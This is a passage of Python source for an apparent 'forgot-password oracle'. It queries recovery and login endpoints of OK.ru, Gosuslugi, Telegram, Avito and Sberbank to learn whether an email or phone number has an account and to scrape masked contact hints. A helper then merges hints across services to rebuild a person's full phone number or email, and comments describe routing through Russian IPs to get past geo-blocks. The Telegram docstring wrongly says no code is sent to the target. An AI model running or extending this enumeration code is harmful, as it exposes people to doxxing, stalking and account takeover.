        if 'restoration' in html.lower() and 'phone' in html.lower():
            result.exists = True
            result.confidence = 0.50

        return result


# ---------------------------------------------------------------------------
# OK.ru Checker
# ---------------------------------------------------------------------------

class OKForgotChecker(ForgotPasswordChecker):
    """
    Odnoklassniki password recovery: POST to https://ok.ru/dk?cmd=PasswordRestore
    email/phone → masked hint (phone or email)
    """

    SERVICE_NAME = "ok"
    SUPPORTS_EMAIL = True
    SUPPORTS_PHONE = True

    RESTORE_URL = "https://ok.ru/dk"

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.session.headers.update({
            'Origin': 'https://ok.ru',
            'Referer': 'https://ok.ru/',
        })

    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        return self._do_restore(email)

    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        return self._do_restore(phone)

    def _do_restore(self, login: str) -> ForgotPasswordResult:
        result = self._make_result()

        params = {
            'cmd': 'PasswordRestore',
            'st.cmd': 'anonymRecoveryAfterRecaptcha',
            'st.login': login,
        }
        resp = self.session.get(
            self.RESTORE_URL,
            params=params,
            timeout=self.timeout,
            allow_redirects=True,
        )
        html = resp.text

        not_found = [
            'Мы не нашли аккаунт',
            'не найден',
            'не зарегистрирован',
        ]
        if any(m in html for m in not_found):
            result.exists = False
            result.confidence = 0.80
            return result

        # Masked phone
        phone_match = re.search(
            r'\+7\s*[\d\*]{1,3}\s*[\d\*]{3}[-\s][\d\*]{2}[-\s][\d\*]{2}',
            html,
        )
        if phone_match:
            result.exists = True
            result.masked_hint = phone_match.group().strip()
            result.hint_type = 'phone'
            result.confidence = 0.82
            return result

        # Masked email
        email_match = re.search(
            r'[a-zA-Z0-9]\*+@[a-zA-Z0-9]+\.[a-zA-Z]{2,}', html
        )
        if email_match:
            result.exists = True
            result.masked_hint = email_match.group().strip()
            result.hint_type = 'email'
            result.confidence = 0.78
            return result

        # Masked name
        name_match = re.search(
            r'([А-Яа-яA-Za-z]+\s*\*+\s+[А-Яа-яA-Za-z]*\*+)', html
        )
        if name_match:
            result.exists = True
            result.masked_hint = name_match.group().strip()
            result.hint_type = 'name'
            result.confidence = 0.70
            return result

        # Generic recovery form detected
        if 'recovery' in html.lower() or 'восстановл' in html.lower():
            result.exists = True
            result.confidence = 0.50

        return result


# ---------------------------------------------------------------------------
# Gosuslugi (ESIA) Checker
# ---------------------------------------------------------------------------

class GosuslugiChecker(ForgotPasswordChecker):
    """
    Gosuslugi (ESIA) password recovery:
    POST to https://esia.gosuslugi.ru/api/public/v1/password/restore

    phone → confirms account exists + masked email hint
    email → confirms account exists + masked phone hint

    # GEO_BLOCKED: Will work from Russian IP on Render (Frankfurt)
    """

    SERVICE_NAME = "gosuslugi"
    SUPPORTS_EMAIL = True
    SUPPORTS_PHONE = True
    GEO_RESTRICTED = True

    RESTORE_URL = "https://esia.gosuslugi.ru/api/public/v1/password/restore"

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://esia.gosuslugi.ru',
            'Referer': 'https://esia.gosuslugi.ru/recovery/',
        })

    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        return self._do_restore(email, identifier_type='email')

    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        return self._do_restore(phone, identifier_type='phone')

    def _do_restore(
        self, identifier: str, identifier_type: str
    ) -> ForgotPasswordResult:
        # GEO_BLOCKED: Will work from Russian IP on Render
        result = self._make_result()

        import json as _json
        payload = {identifier_type: identifier}

        try:
            resp = self.session.post(
                self.RESTORE_URL,
                data=_json.dumps(payload),
                timeout=self.timeout,
            )
        except requests.exceptions.ConnectionError:
            result.error = "geo_blocked"
            self.logger.info("Gosuslugi: connection error (likely geo-blocked)")
            return result

        try:
            data = resp.json()
            result.raw_data = data
        except (ValueError, TypeError):
            data = {}

        if resp.status_code == 404 or data.get('code') == 'NOT_FOUND':
            result.exists = False
            result.confidence = 0.78
            return result

        if resp.status_code in (200, 201):
            result.exists = True

            masked_email = data.get('maskedEmail') or data.get('masked_email')
            masked_phone = data.get('maskedPhone') or data.get('masked_phone')

            if identifier_type == 'phone' and masked_email:
                result.masked_hint = masked_email
                result.hint_type = 'email'
                result.confidence = 0.85
            elif identifier_type == 'email' and masked_phone:
                result.masked_hint = masked_phone
                result.hint_type = 'phone'
                result.confidence = 0.85
            elif masked_email or masked_phone:
                result.masked_hint = masked_email or masked_phone
                result.hint_type = 'email' if masked_email else 'phone'
                result.confidence = 0.80
            else:
                result.confidence = 0.65
            return result

        # Geo-block / CAPTCHA / rate-limit
        if resp.status_code in (403, 429):
            result.error = "blocked_or_rate_limited"
            self.logger.info(
                f"Gosuslugi: HTTP {resp.status_code} — likely geo-blocked"
            )
        return result


# ---------------------------------------------------------------------------
# Telegram Checker
# ---------------------------------------------------------------------------

class TelegramChecker(ForgotPasswordChecker):
    """
    Telegram phone existence check via Telethon.

    Uses client.send_code_request(phone) to check if account exists.
    Does NOT actually send SMS — just checks existence via API response.
    Requires TELEGRAM_API_ID and TELEGRAM_API_HASH environment variables.
    Graceful skip if Telethon is not installed or credentials not configured.
    """

    SERVICE_NAME = "telegram"
    SUPPORTS_EMAIL = False
    SUPPORTS_PHONE = True

    def __init__(self, **kwargs):
        # Don't call super().__init__ — we don't need a requests session
        self.timeout = kwargs.get('timeout', 15)
        self.logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
        self.api_id = os.environ.get('TELEGRAM_API_ID')
        self.api_hash = os.environ.get('TELEGRAM_API_HASH')

    def _is_configured(self) -> bool:
        """Check if Telethon is available and API credentials are set."""
        if not TELETHON_AVAILABLE:
            self.logger.debug("Telethon not installed, skipping Telegram check")
            return False
        if not self.api_id or not self.api_hash:
            self.logger.debug("TELEGRAM_API_ID/HASH not set, skipping")
            return False
        return True

    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        return self._make_result()

    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        result = self._make_result()

        if not self._is_configured():
            result.error = "not_configured"
            return result

        import asyncio

        async def _check():
            session_name = 'forgot_pw_oracle_check'
            client = TelegramClient(
                session_name,
                int(self.api_id),
                self.api_hash,
            )
            try:
                await client.connect()
                # send_code_request will raise if phone not registered
                # or return sent_code object if it is
                sent_code = await client.send_code_request(phone)
                return True, None
            except PhoneNumberInvalidError:
                return False, "invalid_phone"
            except FloodWaitError as e:
                return None, f"flood_wait_{e.seconds}s"
            except ApiIdInvalidError:
                return None, "invalid_api_credentials"
            except Exception as e:
                # Many Telethon errors indicate the phone IS registered
                # but we hit some other issue; be conservative
                error_str = str(e).lower()
                if 'phone_number_unoccupied' in error_str:
                    return False, None
                if 'phone_number_occupied' in error_str:
                    return True, None
                return None, str(e)
            finally:
                try:
                    await client.disconnect()
                except Exception as e:
                    logger.debug(f"[ForgotPasswordOracle] Telegram disconnect error: {e}")

        try:
            # Run async code in a new event loop (safe from sync context)
            loop = asyncio.new_event_loop()
            try:
                exists, error = loop.run_until_complete(_check())
            finally:
                loop.close()

            if error:
                result.error = error
            if exists is True:
                result.exists = True
                result.hint_type = 'phone'
                result.masked_hint = phone  # phone confirmed on Telegram
                result.confidence = 0.90
            elif exists is False:
                result.exists = False
                result.confidence = 0.85

        except Exception as e:
            self.logger.error(f"Telegram check error: {e}", exc_info=True)
            result.error = str(e)

        return result

    # Override base check_phone to skip random_delay (Telethon has its own)
    def check_phone(self, phone: str) -> Optional[ForgotPasswordResult]:
        if not self.SUPPORTS_PHONE:
            return None
        try:
            normalized = normalize_phone(phone)
            return self._check_phone_impl(normalized)
        except Exception as e:
            self.logger.error(f"{self.SERVICE_NAME}: error: {e}", exc_info=True)
            return self._make_result(error=str(e))


# ---------------------------------------------------------------------------
# Avito Checker
# ---------------------------------------------------------------------------

class AvitoChecker(ForgotPasswordChecker):
    """
    Avito password recovery / login check:
    POST to https://www.avito.ru/web/1/passport/login
    email/phone → JSON with masked hint
    """

    SERVICE_NAME = "avito"
    SUPPORTS_EMAIL = True
    SUPPORTS_PHONE = True

    LOGIN_URL = "https://www.avito.ru/web/1/passport/login"

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.avito.ru',
            'Referer': 'https://www.avito.ru/profile/login',
        })

    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        return self._do_check(email, 'email')

    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        return self._do_check(phone, 'phone')

    def _do_check(
        self, identifier: str, identifier_type: str
    ) -> ForgotPasswordResult:
        result = self._make_result()

        import json as _json
        payload = {'login': identifier}

        resp = self.session.post(
            self.LOGIN_URL,
            data=_json.dumps(payload),
            timeout=self.timeout,
        )

        try:
            data = resp.json()
            result.raw_data = data
        except (ValueError, TypeError):
            data = {}

        # Avito returns different status codes for found/not-found
        if resp.status_code == 404 or data.get('error') == 'user_not_found':
            result.exists = False
            result.confidence = 0.75
            return result

        if resp.status_code == 200:
            result.exists = True

            # Extract masked hints from JSON
            masked_phone = data.get('masked_phone') or data.get('phone')
            masked_email = data.get('masked_email') or data.get('email')

            if masked_phone and '*' in str(masked_phone):
                result.masked_hint = masked_phone
                result.hint_type = 'phone'
                result.confidence = 0.78
            elif masked_email and '*' in str(masked_email):
                result.masked_hint = masked_email
                result.hint_type = 'email'
                result.confidence = 0.75
            elif masked_phone or masked_email:
                result.masked_hint = masked_phone or masked_email
                result.hint_type = 'phone' if masked_phone else 'email'
                result.confidence = 0.70
            else:
                result.confidence = 0.55
            return result

        # Rate limited or CAPTCHA
        if resp.status_code in (403, 429):
            result.error = "rate_limited"
            self.logger.info(f"Avito: HTTP {resp.status_code}")

        return result


# ---------------------------------------------------------------------------
# Sberbank Checker
# ---------------------------------------------------------------------------

class SberbankChecker(ForgotPasswordChecker):
    """
    Sberbank Online login check:
    POST to https://online.sberbank.ru/CSAFront/api/requester/login
    phone → confirms account + masked hint

    # GEO_BLOCKED: Will work from Russian IP on Render
    Handle gracefully — timeouts likely from non-Russian IP.
    """

    SERVICE_NAME = "sberbank"
    SUPPORTS_EMAIL = False
    SUPPORTS_PHONE = True
    GEO_RESTRICTED = True

    LOGIN_URL = "https://online.sberbank.ru/CSAFront/api/requester/login"

    def __init__(self, **kwargs):
        # Shorter timeout — Sberbank often hangs from abroad
        kwargs.setdefault('timeout', 10)
        super().__init__(**kwargs)
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://online.sberbank.ru',
            'Referer': 'https://online.sberbank.ru/',
        })

    def _check_email_impl(self, email: str) -> ForgotPasswordResult:
        return self._make_result()

    def _check_phone_impl(self, phone: str) -> ForgotPasswordResult:
        # GEO_BLOCKED: Will work from Russian IP on Render
        result = self._make_result()

        import json as _json
        # Strip +7 prefix — Sberbank expects 10 digits
        digits = re.sub(r'\D', '', phone)
        if digits.startswith('7') and len(digits) == 11:
            digits = digits[1:]
        elif digits.startswith('8') and len(digits) == 11:
            digits = digits[1:]

        payload = {'phone': digits}

        try:
            resp = self.session.post(
                self.LOGIN_URL,
                data=_json.dumps(payload),
                timeout=self.timeout,
            )
        except requests.exceptions.ConnectionError:
            result.error = "geo_blocked"
            self.logger.info("Sberbank: connection error (likely geo-blocked)")
            return result
        except requests.exceptions.Timeout:
            result.error = "timeout_geo_blocked"
            self.logger.info("Sberbank: timeout (likely geo-blocked)")
            return result

        try:
            data = resp.json()
            result.raw_data = data
        except (ValueError, TypeError):
            data = {}

        if resp.status_code == 404 or data.get('error') == 'user_not_found':
            result.exists = False
            result.confidence = 0.72
            return result

        if resp.status_code == 200:
            result.exists = True

            masked = (
                data.get('maskedPhone')
                or data.get('masked_phone')
                or data.get('maskedEmail')
                or data.get('masked_email')
            )
            if masked:
                result.masked_hint = masked
                result.hint_type = 'email' if '@' in str(masked) else 'phone'
                result.confidence = 0.80
            else:
                result.confidence = 0.60
            return result

        # Geo-block / CAPTCHA
        if resp.status_code in (403, 429, 502, 503):
            result.error = "blocked_or_unavailable"
            self.logger.info(
                f"Sberbank: HTTP {resp.status_code} — likely geo-blocked"
            )

        return result


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

class ForgotPasswordOracle:
    """
    Orchestrator that runs all forgot-password checkers sequentially.

    Usage:
        oracle = ForgotPasswordOracle()
        results = oracle.check_all(email="test@mail.ru", phone="+79161234567")
        correlated = cross_correlate_hints(results)
    """

    def __init__(self):
        enable_geo = os.environ.get('ENABLE_GEO_RESTRICTED_CHECKERS', '').lower() in (
            '1', 'true', 'yes',
        )
        all_checkers: List[ForgotPasswordChecker] = [
            VKChecker(),
            MailRuChecker(),
            YandexChecker(),
            OKForgotChecker(),
            GosuslugiChecker(),
            TelegramChecker(),
            AvitoChecker(),
            SberbankChecker(),
        ]
        # Skip geo-restricted checkers unless explicitly enabled
        self.checkers = [
            c for c in all_checkers
            if not c.GEO_RESTRICTED or enable_geo
        ]
        self.logger = logging.getLogger(f"{__name__}.ForgotPasswordOracle")
        if not enable_geo:
            skipped = [c.SERVICE_NAME for c in all_checkers if c.GEO_RESTRICTED]
            if skipped:
                self.logger.info(
                    f"Skipping geo-restricted checkers: {', '.join(skipped)}. "
                    f"Set ENABLE_GEO_RESTRICTED_CHECKERS=1 for Russian IP deployments."
                )

    def check_email(self, email: str) -> List[Dict[str, Any]]:
        """
        Run all email-supporting checkers with the given email.

        Returns list of result dicts (only checkers that support email).
        """
        results = []
        for checker in self.checkers:
            if not checker.SUPPORTS_EMAIL:
                continue
            self.logger.info(f"Checking {checker.SERVICE_NAME} with email...")
            result = checker.check_email(email)
            if result is not None:
                results.append(result.to_dict())
        return results

    def check_phone(self, phone: str) -> List[Dict[str, Any]]:
        """
        Run all phone-supporting checkers with the given phone.

        Returns list of result dicts (only checkers that support phone).
        """
        results = []
        for checker in self.checkers:
            if not checker.SUPPORTS_PHONE:
                continue
            self.logger.info(f"Checking {checker.SERVICE_NAME} with phone...")
            result = checker.check_phone(phone)
            if result is not None:
                results.append(result.to_dict())
        return results

    def check_all(
        self,
        email: Optional[str] = None,
        phone: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """
        Run all checkers with available identifiers (email and/or phone).
        Returns combined list of results from all checkers.
        """
        results = []

        for checker in self.checkers:
            # Try email first
            if email and checker.SUPPORTS_EMAIL:
                self.logger.info(
                    f"Checking {checker.SERVICE_NAME} with email..."
                )
                r = checker.check_email(email)
                if r is not None:
                    results.append(r.to_dict())

            # Then phone (may give different hint)
            if phone and checker.SUPPORTS_PHONE:
                self.logger.info(
                    f"Checking {checker.SERVICE_NAME} with phone..."
                )
                r = checker.check_phone(phone)
                if r is not None:
                    results.append(r.to_dict())

        return results

    def check_vk_usernames(self, usernames: List[str]) -> List[Dict[str, Any]]:
        """
        Run VK forgot-password oracle on each username via Playwright.

        Args:
            usernames: List of VK screen_names (e.g., ['ivan_petrov', 'durov'])

        Returns:
            List of result dicts from successful checks.
        """
        checker = VKUsernameForgotChecker(timeout=30)
        results = []
        for username in usernames:
            result = checker.check_username(username)
            if result is not None:
                results.append(result.to_dict())
        return results

    def demo_results(
        self,
        email: Optional[str] = None,
        phone: Optional[str] = None,
        usernames: Optional[List[str]] = None,
    ) -> List[Dict[str, Any]]:
        """
        Return realistic demo results without making any network requests.
        Useful for demo mode or when network is unavailable.
        """
        demo = []

        if email:
            # VK: email → masked phone
            demo.append({
                'service': 'vk',
                'exists': True,
                'masked_hint': '+7 9** ***-**-67',
                'hint_type': 'phone',
                'confidence': 0.85,
                'error': None,
            })
            # Mail.ru: email → masked phone
            demo.append({
                'service': 'mailru',
                'exists': True,
                'masked_hint': '+7 916 ***-**-67',
                'hint_type': 'phone',
                'confidence': 0.80,
                'error': None,
            })
            # Yandex: email → masked phone
            demo.append({
                'service': 'yandex',
                'exists': True,
                'masked_hint': '+7 *** ***-45-**',
                'hint_type': 'phone',
                'confidence': 0.83,
                'error': None,
            })
            # OK: email → masked phone
            demo.append({
                'service': 'ok',
                'exists': True,
                'masked_hint': '+7 *** 123-**-**',
                'hint_type': 'phone',
                'confidence': 0.82,
                'error': None,
            })
            # Gosuslugi: email → masked phone (geo-blocked in demo)
            demo.append({
                'service': 'gosuslugi',
                'exists': None,
                'masked_hint': None,
                'hint_type': None,
                'confidence': 0.0,
                'error': 'geo_blocked',
            })
            # Avito: email → exists but no hint
            demo.append({
                'service': 'avito',
                'exists': True,
                'masked_hint': None,
                'hint_type': None,
                'confidence': 0.55,
                'error': None,
            })

        if phone:
            # VK: phone → masked email
            demo.append({
                'service': 'vk',
                'exists': True,
                'masked_hint': 'iv***@mail.ru',
                'hint_type': 'email',
                'confidence': 0.82,
                'error': None,
            })
            # Yandex: phone → exists
            demo.append({
                'service': 'yandex',
                'exists': True,
                'masked_hint': None,
                'hint_type': None,
                'confidence': 0.65,
                'error': None,
            })
            # OK: phone → masked email
            demo.append({
                'service': 'ok',
                'exists': True,
                'masked_hint': 'i****v@yandex.ru',
                'hint_type': 'email',
                'confidence': 0.78,
                'error': None,
            })
            # Telegram: phone → registered
            demo.append({
                'service': 'telegram',
                'exists': True,
                'masked_hint': phone,
                'hint_type': 'phone',
                'confidence': 0.90,
                'error': None,
            })
            # Gosuslugi: geo-blocked
            demo.append({
                'service': 'gosuslugi',
                'exists': None,
                'masked_hint': None,
                'hint_type': None,
                'confidence': 0.0,
                'error': 'geo_blocked',
            })
            # Sberbank: geo-blocked
            demo.append({
                'service': 'sberbank',
                'exists': None,
                'masked_hint': None,
                'hint_type': None,
                'confidence': 0.0,
                'error': 'geo_blocked',
            })

        if usernames:
            for uname in usernames:
                demo.append({
                    'service': 'vk_forgot_password',
                    'exists': True,
                    'masked_hint': '+7 916 ***-**-67',
                    'hint_type': 'phone',
                    'confidence': 0.85,
                    'error': None,
                })

        return demo


# ---------------------------------------------------------------------------
# Cross-correlation helper
# ---------------------------------------------------------------------------

def cross_correlate_hints(results: List[Dict[str, Any]]) -> Dict[str, Any]:
    """
    Cross-correlate masked hints from multiple services to reconstruct digits.

    If Mail.ru shows '+7 916 ***-**-67' and VK shows '+7 9** ***-**-67',
    merge to get '+7 916 ***-**-67' (more digits known).

    If Yandex shows '+7 *** ***-45-**' and OK shows '+7 *** 123-**-**',
    merge to get '+7 *** 123-45-**'.

    Returns:
        {
            'phone_hints': ['+7 916 ***-**-67', ...],
            'email_hints': ['iv***@mail.ru', ...],
            'merged_phone': '+7 916 123-45-67',  # best reconstruction
            'merged_email': 'iv***v@mail.ru',     # best reconstruction
            'known_digits': 8,                     # out of 11
            'services_found': ['vk', 'mailru', ...],
            'services_not_found': ['avito'],
            'services_error': ['gosuslugi', 'sberbank'],
        }
    """
    phone_hints: List[str] = []
    email_hints: List[str] = []
    services_found: List[str] = []
    services_not_found: List[str] = []
    services_error: List[str] = []

    for r in results:
        service = r.get('service', 'unknown')

        if r.get('error'):
            if service not in services_error:
                services_error.append(service)
            continue

        if r.get('exists') is True:
            if service not in services_found:
                services_found.append(service)

            hint = r.get('masked_hint')
            hint_type = r.get('hint_type')
            if hint and hint_type == 'phone':
                phone_hints.append(hint)
            elif hint and hint_type == 'email':
                email_hints.append(hint)

        elif r.get('exists') is False:
            if service not in services_not_found:
                services_not_found.append(service)

    # ---- Merge phone hints ----
    merged_phone = _merge_masked_phones(phone_hints) if phone_hints else None
    known_digits = _count_known_digits(merged_phone) if merged_phone else 0

    # ---- Merge email hints ----
    merged_email = _merge_masked_emails(email_hints) if email_hints else None

    return {
        'phone_hints': phone_hints,
        'email_hints': email_hints,
        'merged_phone': merged_phone,
        'merged_email': merged_email,
        'known_digits': known_digits,
        'services_found': services_found,
        'services_not_found': services_not_found,
        'services_error': services_error,
    }


def _merge_masked_phones(hints: List[str]) -> str:
    """
    Merge multiple masked phone strings into one with maximum known digits.

    Each hint is like '+7 916 ***-**-67' or '+7 *** ***-45-**'.
    We align by digit position and pick the known digit wherever available.
    """
    if not hints:
        return ''
    if len(hints) == 1:
        return hints[0]

    # Normalize all hints to pure digit/star sequences (strip formatting)
    def _to_chars(hint: str) -> List[str]:
        """Extract digits and stars, preserving position."""
        chars = []
        for ch in hint:
            if ch.isdigit() or ch == '*':
                chars.append(ch)
        return chars

    char_lists = [_to_chars(h) for h in hints]

    # Find max length (should be ~11 for Russian phones)
    max_len = max(len(cl) for cl in char_lists)

    # Pad shorter ones with '*' on the left
    padded = []
    for cl in char_lists:
        if len(cl) < max_len:
            cl = ['*'] * (max_len - len(cl)) + cl
        padded.append(cl)

    # Merge: pick digit over star at each position
    merged = []
    for i in range(max_len):
        digit = '*'
        for cl in padded:
            if i < len(cl) and cl[i].isdigit():
                digit = cl[i]
                break
        merged.append(digit)

    # Format back to +7 XXX XXX-XX-XX style
    s = ''.join(merged)
    if len(s) >= 11:
        # +7 XXX XXX-XX-XX
        return f"+{s[0]} {s[1:4]} {s[4:7]}-{s[7:9]}-{s[9:11]}"
    return s


def _merge_masked_emails(hints: List[str]) -> str:
    """
    Merge multiple masked email strings.

    E.g., 'iv***@mail.ru' and 'i****v@mail.ru' → 'iv***v@mail.ru'
    """
    if not hints:
        return ''
    if len(hints) == 1:
        return hints[0]

    # Split local part and domain
    parsed = []
    for h in hints:
        if '@' in h:
            local, domain = h.split('@', 1)
            parsed.append((local, domain))
        else:
            parsed.append((h, ''))

    # Use the longest domain (most specific)
    best_domain = max((d for _, d in parsed if d), key=len, default='')

    # Merge local parts character by character
    locals_list = [p[0] for p in parsed]
    max_len = max(len(lp) for lp in locals_list)

    merged_local = []
    for i in range(max_len):
        char = '*'
        for lp in locals_list:
            if i < len(lp) and lp[i] != '*':
                char = lp[i]
                break
        merged_local.append(char)

    result = ''.join(merged_local)
    if best_domain:
        result = f"{result}@{best_domain}"
    return result


def _count_known_digits(masked_phone: str) -> int:
    """Count how many actual digits (non-star) are in a masked phone string."""
    if not masked_phone:
        return 0
    return sum(1 for ch in masked_phone if ch.isdigit())


# ---------------------------------------------------------------------------
# Convenience functions
# ---------------------------------------------------------------------------

def check_forgot_password(
    email: Optional[str] = None,
    phone: Optional[str] = None,
) -> List[Dict[str, Any]]:
    """Convenience function: run all checkers and return results."""
    oracle = ForgotPasswordOracle()
    return oracle.check_all(email=email, phone=phone)


def check_forgot_password_demo(
    email: Optional[str] = None,
    phone: Optional[str] = None,
) -> List[Dict[str, Any]]:
    """Convenience function: return demo results without network."""
    oracle = ForgotPasswordOracle()
    return oracle.demo_results(email=email, phone=phone)
